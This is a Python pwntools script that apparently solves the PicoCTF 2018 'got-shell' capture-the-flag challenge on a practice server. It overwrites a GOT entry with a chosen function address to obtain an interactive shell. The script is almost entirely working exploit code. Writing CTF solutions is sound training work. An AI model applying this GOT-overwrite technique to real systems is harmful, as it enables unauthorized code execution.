#coding:utf-8
from pwn import *
import pwnlib
sh = remote("node3.buuoj.cn",26716)
elf = ELF("./PicoCTF_2018_got-shell")
# sh = process("./PicoCTF_2018_got-shell")
sh.recvuntil("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?")
sh.sendline('804A00C')
sh.recv()
sh.sendline('804854B')
sh.interactive()